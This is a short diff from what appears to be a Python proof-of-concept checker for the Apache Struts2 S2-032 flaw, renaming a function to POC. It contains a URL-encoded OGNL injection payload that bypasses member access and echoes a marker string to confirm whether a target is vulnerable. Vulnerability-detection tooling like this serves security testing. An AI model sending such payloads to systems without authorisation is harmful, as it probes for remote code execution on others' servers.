@@ -9,7 +9,7 @@ def POC_INFO():
     dict_poc["author"]="跳跳龙"
     return dict_poc
 
-def struts_032(target_url):
+def POC(target_url):
     try:
         poc = "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=tiaotiaolong_032"
         poc_url = target_url + poc
